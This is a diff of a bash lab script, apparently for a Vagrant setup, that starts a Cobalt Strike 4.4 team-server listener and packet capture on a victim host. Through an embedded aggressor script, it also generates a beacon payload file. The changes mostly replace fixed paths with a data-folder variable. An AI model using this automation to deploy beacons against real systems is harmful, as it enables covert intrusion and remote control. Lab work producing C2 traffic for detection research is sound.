@@ -1,4 +1,5 @@
 #!/bin/bash
+set -e
 
 rm -rf Cobaltstrike-4.4
 unzip /vagrant/cobaltstrike-4.4.zip
@@ -38,23 +39,22 @@ on beacon_output {
 EOF
 
 echo "Listener starting ..."
-nohup ./agscript $ts_host 50050 monlis $ts_password /tmp/listener.cna &> /vagrant/data/listener.log &
+nohup ./agscript $ts_host 50050 monlis $ts_password /tmp/listener.cna &> $data_folder/listener.log &
 sleep 10
-cat /tmp/listener.log
+cat $data_folder/listener.log
 echo -n "agscript PID: "
 pgrep agscript
 
-nohup tshark -i $server_nic -f "tcp and net $victim_host" -c $packet_cnt -w /vagrant/data/$pcap_file_name &> /vagrant/data/tshark.log &
+nohup tshark -i $server_nic -f "not arp and net $victim_host" -c $packet_cnt -w $data_folder/$pcap_file_name &> $data_folder/tshark.log &
 sleep 5
 echo -n "tshark PID: "
 pgrep tshark
 
 cat << 'EOF' > /tmp/beacon.cna
 on ready {
-  println("Existing listeners:");
-  printAll(listeners());
+  println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Existing listeners: " . listeners());
   $$data = artifact_payload("$listener_name", "$beacon_format", "$arch", "process", "None");
-  $$handle = openf(">/vagrant/data/$beacon_file");
+  $$handle = openf(">$data_folder/$beacon_file");
   writeb($$handle, $$data);
   closef($$handle);
   println("[Ready]" . formatDate("yyyy.MM.dd HH:mm:ss z") . " Beacon " . "$beacon_file" . " created successfully!")
@@ -63,7 +63,7 @@ on ready {
 EOF
 
 echo "Generating beacon ..."
-./agscript $ts_host 50050 bob $ts_password /tmp/beacon.cna &> /vagrant/data/beacon.log
+./agscript $ts_host 50050 bob $ts_password /tmp/beacon.cna &> $data_folder/beacon.log
 sleep 5
-cat /tmp/beacon.log
+cat $data_folder/beacon.log
 
